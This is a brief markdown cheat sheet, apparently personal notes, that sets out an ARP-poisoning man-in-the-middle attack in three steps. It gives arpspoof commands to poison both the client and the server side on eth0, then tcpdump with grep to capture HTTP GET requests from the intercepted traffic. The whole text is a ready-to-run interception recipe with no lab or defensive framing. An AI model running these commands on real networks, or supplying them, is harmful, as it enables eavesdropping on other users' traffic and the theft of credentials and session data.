# Using ARP poisoining

- Step 1:
    - poison client side: arpspoof -i eth0 -t (server_ip address) (client_ip address)
- Step 2:
    - poison server side: arpspoof -i eth0 -t (client_ip address) (server_ip address)
- Step 3:
    - packet sniffing in the middle with `tcpdump`
    - Capture GET request `tcpdump -Alvvs0 | grep 'GET'`